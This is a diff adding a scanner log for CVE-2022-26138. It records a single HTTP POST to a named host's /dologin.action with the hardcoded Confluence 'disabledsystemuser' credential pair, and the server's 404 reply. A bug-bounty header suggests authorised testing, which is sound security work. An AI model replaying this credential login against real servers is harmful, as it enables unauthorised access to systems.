@@ -1,0 +1,34 @@
+[CVE-2022-26138] Dumped HTTP request for https://status.techsolutions.bitpanda.com/dologin.action
+
+
+POST /dologin.action HTTP/1.1
+Host: status.techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Ubuntu; Linux i686; rv:134.0) Gecko/20100101 Firefox/134.0
+Content-Length: 114
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+os_username=disabledsystemuser&os_password=disabled1system1user6708&login=Log+in&os_destination=%2Fhttpvoid.action
+[CVE-2022-26138] Dumped HTTP response https://status.techsolutions.bitpanda.com/dologin.action
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 0
+Atl-Request-Id: d5829baf-d93b-45af-a15f-a163bba95724
+Atl-Traceid: d5829bafd93b45afa15fa163bba95724
+Date: Tue, 05 Aug 2025 12:53:15 GMT
+Nel: {"failure_fraction": 0.001, "include_subdomains": true, "max_age": 600, "report_to": "endpoint-1"}
+Report-To: {"endpoints": [{"url": "https://dz8aopenkvv6s.cloudfront.net"}], "group": "endpoint-1", "include_subdomains": true, "max_age": 600}
+Server: AtlassianEdge
+Server-Timing: atl-edge;dur=67,atl-edge-internal;dur=3,atl-edge-upstream;dur=64,atl-edge-pop;desc="aws-us-east-1"
+Strict-Transport-Security: max-age=63072000; preload
+Via: 1.1 c242c974a465288488c7876cabca7752.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: TNYiW-v4VIBzDjrxlilXmBJzpRCdXM30dxjNuCBpOeMp0q95unyCLg==
+X-Amz-Cf-Pop: IAD89-C2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Varnish: 166888737
+X-Xss-Protection: 1; mode=block
+
+
